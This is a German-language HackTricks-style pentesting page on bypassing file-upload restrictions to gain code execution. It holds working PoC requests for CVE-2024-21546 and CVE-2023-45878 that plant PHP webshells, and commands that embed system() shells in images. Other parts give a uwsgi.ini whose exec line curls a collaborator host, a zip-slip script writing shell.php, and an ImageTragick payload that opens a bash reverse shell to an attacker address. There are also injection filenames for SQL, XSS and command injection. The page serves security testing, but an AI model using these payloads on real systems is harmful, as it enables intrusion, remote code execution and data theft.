# Datei-Upload

{{#include ../../banners/hacktricks-training.md}}

## Allgemeine Methodik für Datei-Uploads

Weitere nützliche Erweiterungen:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Arbeiten mit PHPv8**: _.php_, _.php4_, .php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Umgehen von Dateiendungsprüfungen

1. Falls vorhanden, überprüfe die vorherigen Erweiterungen. Teste sie auch mit einigen **Großbuchstaben**: _pHp, .pHP5, .PhAr ..._
2. _Prüfe, **eine gültige Erweiterung vor** der Ausführungs-Endung hinzuzufügen (verwende auch die vorherigen Erweiterungen):_
- _file.png.php_
- _file.png.Php5_
3. Versuche, **Sonderzeichen am Ende** hinzuzufügen. Du kannst Burp verwenden, um alle **ascii** und **Unicode** Zeichen zu **bruteforce**n. (_Hinweis: Du kannst auch versuchen, die zuvor genannten Erweiterungen zu verwenden_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Versuche, die Schutzmechanismen zu umgehen, indem du den Extension-Parser auf Serverseite austrickst, mit Techniken wie **doubling** der **extension** oder dem Hinzufügen von Junk-Daten (**null** bytes) zwischen den Endungen. _Du kannst auch die vorherigen Erweiterungen verwenden, um ein besseres Payload vorzubereiten._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Füge **eine weitere Schicht von Erweiterungen** zur vorherigen Prüfung hinzu:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Versuche, die **exec extension before the valid extension** zu setzen und hoffe, dass der Server falsch konfiguriert ist. (Nützlich, um Apache-Misconfigurations auszunutzen, bei denen alles mit der Erweiterung **.php**, aber nicht notwendigerweise endend in .php, Code ausführt):
- _ex: file.php.png_
7. Verwendung von **NTFS alternate data stream (ADS)** in **Windows**. In diesem Fall wird ein Doppelpunkt ":" nach einer verbotenen Erweiterung und vor einer erlaubten eingefügt. In der Folge wird eine **leere Datei mit der verbotenen Erweiterung** auf dem Server erstellt (z. B. "file.asax:.jpg"). Diese Datei kann später mit anderen Techniken bearbeitet werden, z. B. über ihren Short Filename. Das Muster "**::$data**" kann ebenfalls verwendet werden, um nicht-leere Dateien zu erstellen. Daher kann es nützlich sein, nach diesem Muster einen Punkt hinzuzufügen, um weitere Beschränkungen zu umgehen (z. B. "file.asp::$data.")
8. Versuche, die Dateinamenbegrenzungen zu überschreiten. Die gültige Erweiterung wird abgeschnitten und das bösartige PHP bleibt übrig. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Einige Upload-Handler trimmen oder normalisieren nachgestellte Punktzeichen im gespeicherten Dateinamen. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) Versionen vor 2.9.1 kannst du die Erweiterungsvalidierung umgehen durch:

- Verwendung eines gültigen image MIME und magic headers (z. B. PNG’s `\x89PNG\r\n\x1a\n`).
- Den hochgeladenen Datei mit einer PHP-Erweiterung gefolgt von einem Punkt benennen, z. B. `shell.php.`.
- Der Server entfernt den nachgestellten Punkt und speichert `shell.php`, welches ausgeführt wird, wenn es in einem web-freigegebenen Verzeichnis liegt (standardmäßiger public storage wie `/storage/files/`).

Minimales PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Dann rufe den gespeicherten Pfad auf (typisch in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Gegenmaßnahmen:
- Aktualisiere unisharp/laravel-filemanager auf ≥ 2.9.1.
- Durchsetze strikte serverseitige allowlists und validiere den persistierten Dateinamen erneut.
- Stelle Uploads aus nicht-ausführbaren Verzeichnissen bereit.

### Umgehen von Content-Type, Magic Number, Compression & Resizing

- Umgehe **Content-Type**-Prüfungen, indem du den **Wert** des **Content-Type** **Headers** auf: _image/png_ , _text/plain , application/octet-stream_ setzt
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Umgehe die **magic number**-Prüfung, indem du am Anfang der Datei die **Bytes eines echten Bildes** hinzufügst (verwirre den _file_ command). Oder platziere die Shell in den **Metadaten**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oder du könntest das **payload direkt in ein Bild einfügen**:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Wenn **Kompressionen** deinem Bild hinzugefügt werden, z. B. mit Standard-PHP-Bibliotheken wie [PHP-GD](https://www.php.net/manual/fr/book.image.php), sind die vorherigen Techniken nicht mehr nützlich. Du könntest jedoch die **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzufügen, der die **Kompression überlebt**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Die Webseite könnte das **Bild auch skalieren**, z. B. mit den PHP-GD-Funktionen `imagecopyresized` oder `imagecopyresampled`. Du könntest jedoch den **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzufügen, der die **Kompression überlebt**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Eine weitere Technik, um ein Payload zu erstellen, das eine Bild-Resizing überlebt, verwendet die PHP-GD-Funktion `thumbnailImage`. Du könntest jedoch den **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzufügen, der die **Kompression überlebt**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Weitere Tricks zum Prüfen

- Finde eine Verwundbarkeit, um die bereits hochgeladene Datei zu **rename** (z. B. um die Extension zu ändern).
- Finde eine **Local File Inclusion**-Schwachstelle, um die Backdoor auszuführen.
- **Mögliche Informationsoffenlegung**:
1. Lade die **gleiche Datei** **mehrfach** (und **gleichzeitig**) mit **dem gleichen Namen** hoch.
2. Lade eine Datei mit dem **Namen** einer **bereits vorhandenen Datei** oder eines **bereits vorhandenen Ordners** hoch.
3. Lade eine Datei mit **"." , "..", or "…" als Namen** hoch. Zum Beispiel: Unter Apache auf **Windows**, wenn die Anwendung die hochgeladenen Dateien im Verzeichnis "/www/uploads/" speichert, erzeugt der Dateiname "." eine Datei namens uploads in "/www/".
4. Lade eine Datei hoch, die sich nur schwer löschen lässt, z. B. **"…:.jpg"** auf **NTFS**. (Windows)
5. Lade unter **Windows** eine Datei mit **ungültigen Zeichen** wie `|<>*?”` im Namen hoch. (Windows)
6. Lade unter **Windows** eine Datei mit **reservierten** (**verbotenen**) **Namen** hoch wie CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 und LPT9.
- Versuche außerdem, eine **ausführbare Datei** (.exe) oder eine **.html** (weniger verdächtig) hochzuladen, die beim versehentlichen Öffnen durch das Opfer **Code ausführt**.

### Special extension tricks

Wenn du versuchst, Dateien auf einen **PHP server** hochzuladen, [schau dir den **.htaccess**-Trick an, um Code auszuführen](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Wenn du versuchst, Dateien auf einen **ASP server** hochzuladen, [schau dir den **.config**-Trick an, um Code auszuführen](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar`-Dateien sind wie die `.jar` für Java, aber für PHP, und können **wie eine php-Datei verwendet werden** (mit php ausgeführt oder in ein Script inkludiert...).

Die `.inc`-Extension wird manchmal für PHP-Dateien verwendet, die nur zum **Importieren von Dateien** dienen. Daher könnte diese Extension zu einem Zeitpunkt zur Ausführung erlaubt worden sein.

## **Jetty RCE**

Wenn du eine XML-Datei auf einen Jetty-Server hochladen kannst, kannst du [RCE erhalten, weil **neue *.xml and *.war automatisch verarbeitet werden**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Wie im folgenden Bild erwähnt: lade die XML-Datei nach `$JETTY_BASE/webapps/` hoch und erwarte die Shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Für eine detaillierte Untersuchung dieser Schwachstelle siehe die Originalforschung: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE)-Schwachstellen können auf uWSGI-Servern ausgenutzt werden, wenn man die Möglichkeit hat, die `.ini`-Konfigurationsdatei zu verändern. uWSGI-Konfigurationsdateien verwenden eine spezifische Syntax, um "magic" Variablen, Platzhalter und Operatoren einzubinden. Besonders hervorgehoben ist der '@'-Operator, der als `@(filename)` verwendet wird und dazu dient, den Inhalt einer Datei einzuschließen. Unter den verschiedenen in uWSGI unterstützten schemes ist das "exec"-scheme besonders mächtig, da es erlaubt, Daten aus der Standardausgabe eines Prozesses zu lesen. Diese Funktion kann missbraucht werden für böswillige Zwecke wie Remote Command Execution oder Arbitrary File Write/Read, wenn eine `.ini`-Konfigurationsdatei verarbeitet wird.

Betrachte das folgende Beispiel einer schadhaften `uwsgi.ini`-Datei, die verschiedene schemes demonstriert:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die Ausführung des payload erfolgt während des Parsings der Konfigurationsdatei. Damit die Konfiguration aktiviert und geparst wird, muss der uWSGI-Prozess entweder neu gestartet werden (möglicherweise nach einem Absturz oder aufgrund eines Denial of Service attack) oder die Datei muss auf auto-reload gesetzt sein. Die auto-reload-Funktion, falls aktiviert, lädt die Datei in festgelegten Intervallen neu, sobald Änderungen erkannt werden.

Es ist wichtig, die lockere Art und Weise zu verstehen, wie uWSGI Konfigurationsdateien geparst werden. Konkret kann der besprochene payload in eine Binärdatei (z. B. ein Bild oder eine PDF) eingefügt werden, wodurch der potenzielle Exploitbereich weiter ausgedehnt wird.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Ein unauthentifizierter Endpoint in Gibbon LMS erlaubt arbitrary file write innerhalb des web root und führt zu pre-auth RCE durch Ablegen einer PHP-Datei. Vulnerable versions: up to and including 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignoriert type/name und dekodiert den Tail mit base64)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimales PoC, um eine Datei zu schreiben und wieder einzulesen:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Lege eine minimale webshell ab und führe Befehle aus:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Hinweise:
- The handler performs `base64_decode($_POST["img"])` after splitting by `;` and `,`, then writes bytes to `$absolutePath . '/' . $_POST['path']` without validating extension/type.
- Resulting code runs as the web service user (e.g., XAMPP Apache on Windows).

Als Referenzen für diesen Bug dienen das usd HeroLab advisory und der NVD-Eintrag. Siehe den Abschnitt References weiter unten.

## **wget Datei-Upload/SSRF-Trick**

In einigen Fällen kann es vorkommen, dass ein Server **`wget`** verwendet, um **Dateien herunterzuladen** und Sie die **URL** angeben können. In solchen Fällen prüft der Code möglicherweise, dass die Erweiterung der heruntergeladenen Dateien in einer Whitelist enthalten ist, um sicherzustellen, dass nur erlaubte Dateien heruntergeladen werden. Diese Prüfung lässt sich jedoch **umgehen.**\
Die **maximale** Länge eines **filename** in **linux** ist **255**, allerdings kürzt **wget** die filenames auf **236** Zeichen. Sie können **download a file called "A"*232+".php"+".gif"**, dieser Dateiname wird die **check** **bypass** (in diesem Beispiel ist **".gif"** eine **valid** extension), aber `wget` wird die Datei in **"A"*232+".php"** umbenennen.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Beachte, dass eine **andere Option**, an die du vielleicht denkst, um diese Überprüfung zu umgehen, darin besteht, den **HTTP server so umzuleiten, dass er auf eine andere Datei verweist**, sodass die ursprüngliche URL die Prüfung umgeht — wget würde dann jedoch die umgeleitete Datei mit dem neuen Namen herunterladen. Das **funktioniert nicht**, **es sei denn**, wget wird mit dem **Parameter** `--trust-server-names` verwendet, da **wget die umgeleitete Seite mit dem im ursprünglichen URL angegebenen Dateinamen herunterlädt**.

### Upload-Verzeichnis über NTFS junctions umgehen (Windows)

(Für diesen Angriff benötigst du lokalen Zugriff auf die Windows-Maschine) Wenn Uploads unter benutzerspezifischen Unterordnern auf Windows gespeichert werden (z. B. C:\Windows\Tasks\Uploads\<id>\) und du die Erstellung/Löschung dieses Unterordners kontrollierst, kannst du ihn durch eine directory junction ersetzen, die auf einen sensiblen Ort zeigt (z. B. das webroot). Nachfolgende Uploads werden in den Zielpfad geschrieben und ermöglichen Codeausführung, wenn das Ziel serverseitigen Code interpretiert.

Beispielablauf, um Uploads in das XAMPP webroot umzuleiten:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Notes
- mklink /J creates an NTFS directory junction (reparse point). The web server’s account must follow the junction and have write permission in the destination.
- This redirects arbitrary file writes; if the destination executes scripts (PHP/ASP), this becomes RCE.
- Defenses: don’t allow writable upload roots to be attacker‑controllable under C:\Windows\Tasks or similar; block junction creation; validate extensions server‑side; store uploads on a separate volume or with deny‑execute ACLs.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Corrupting upload indices with snprintf quirks (historical)

Some legacy upload handlers that use `snprintf()` or similar to build multi-file arrays from a single-file upload can be tricked into forging the `_FILES` structure. Due to inconsistencies and truncation in `snprintf()` behavior, a carefully crafted single upload can appear as multiple indexed files on the server side, confusing logic that assumes a strict shape (e.g., treating it as a multi-file upload and taking unsafe branches). While niche today, this “index corruption” pattern occasionally resurfaces in CTFs and older codebases.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### In verschiedene Ordner dekomprimieren

Die unerwartete Erstellung von Dateien in Verzeichnissen während der Dekompression ist ein erhebliches Problem. Trotz anfänglicher Annahmen, dass diese Konfiguration vor OS-level command execution durch bösartige uploads schützen könnte, lassen sich die hierarchische Kompressionsunterstützung und die directory traversal-Fähigkeiten des ZIP-Archivformats ausnutzen. Dies ermöglicht Angreifern, Beschränkungen zu umgehen und aus sicheren upload directories zu entkommen, indem sie die Dekompressionsfunktionalität der Zielanwendung manipulieren.

Ein automatisierter exploit zum Erstellen solcher Dateien ist verfügbar unter [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Das Tool kann wie folgt verwendet werden:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Außerdem ist der **symlink trick with evilarc** eine Option. Wenn das Ziel eine Datei wie `/flag.txt` ist, sollte ein symlink zu dieser Datei in Ihrem System erstellt werden. Damit verhindert man, dass evilarc während seiner Ausführung auf Fehler stößt.

Unten ist ein Beispiel für Python-Code, mit dem eine bösartige ZIP-Datei erstellt wird:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Missbrauch von Kompression für file spraying**

Für weitere Details **siehe den Originalbeitrag unter**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Erstellen einer PHP Shell**: PHP-Code wird geschrieben, um Befehle auszuführen, die über die `$_REQUEST`-Variable übergeben werden.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying und Erstellung komprimierter Dateien**: Mehrere Dateien werden erstellt und ein zip-Archiv wird zusammengestellt, das diese Dateien enthält.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Änderung mit einem Hex-Editor oder vi**: Die Namen der Dateien im zip werden mithilfe von vi oder einem Hex-Editor verändert, indem "xxA" in "../" geändert wird, um Verzeichnisse zu traversieren.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Lade diesen Inhalt mit einer Bild-Erweiterung hoch, um die Verwundbarkeit **(ImageMagick , 7.0.1-1)** auszunutzen (siehe den [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Einbetten einer PHP shell in eine PNG-Datei

Das Einbetten einer PHP shell in den IDAT-Chunk einer PNG-Datei kann bestimmte Bildverarbeitungsoperationen effektiv umgehen. Die Funktionen `imagecopyresized` und `imagecopyresampled` von PHP-GD sind in diesem Kontext besonders relevant, da sie häufig zum Resizing bzw. Resampling von Bildern verwendet werden. Die Fähigkeit der eingebetteten PHP shell, von diesen Operationen unberührt zu bleiben, ist für bestimmte Anwendungsfälle ein wesentlicher Vorteil.

Eine detaillierte Untersuchung dieser Technik, inklusive Methodik und potenzieller Anwendungen, findet sich im folgenden Artikel: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Diese Ressource bietet ein umfassendes Verständnis des Prozesses und seiner Implikationen.

Mehr Informationen unter: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot-Dateien

Polyglot-Dateien dienen als einzigartiges Werkzeug in der Cybersicherheit und wirken wie Chamäleons, die gleichzeitig in mehreren Dateiformaten gültig existieren können. Ein interessantes Beispiel ist ein [GIFAR](https://en.wikipedia.org/wiki/Gifar), ein Hybrid, der sowohl als GIF als auch als RAR-Archiv funktioniert. Solche Dateien sind nicht auf dieses Paar beschränkt; Kombinationen wie GIF und JS oder PPT und JS sind ebenfalls möglich.

Der Hauptnutzen von Polyglot-Dateien liegt darin, Sicherheitsmaßnahmen zu umgehen, die Dateien anhand ihres Typs filtern. Übliche Praxis in vielen Anwendungen ist es, nur bestimmte Dateitypen für Uploads zu erlauben — etwa JPEG, GIF oder DOC — um das Risiko potenziell schädlicher Formate (z. B. JS, PHP oder Phar) zu reduzieren. Ein Polyglot kann jedoch, indem es den strukturellen Kriterien mehrerer Dateitypen entspricht, diese Beschränkungen heimlich umgehen.

Trotz ihrer Anpassungsfähigkeit stoßen Polyglots auf Einschränkungen. Beispielsweise kann ein Polyglot sowohl eine PHAR-Datei (PHp ARchive) als auch ein JPEG darstellen; der erfolgreiche Upload kann jedoch von den Richtlinien der Plattform bezüglich Dateiendungen abhängen. Wenn das System strikt auf erlaubte Extensions achtet, reicht die strukturelle Dualität eines Polyglots möglicherweise nicht aus, um den Upload zu garantieren.

Mehr Informationen in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Gültige JSONs hochladen, als wären sie PDFs

Wie man Dateityp-Erkennungen umgeht, indem man eine gültige JSON-Datei hochlädt, selbst wenn nur PDF erlaubt ist (Techniken aus **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Solange die `%PDF` magic bytes in den ersten 1024 Bytes sind, gilt die Datei als gültig (Beispiel im Beitrag).
- **`pdflib` library**: Füge ein gefälschtes PDF-Format in ein Feld des JSON ein, sodass die Bibliothek denkt, es sei ein PDF (Beispiel im Beitrag).
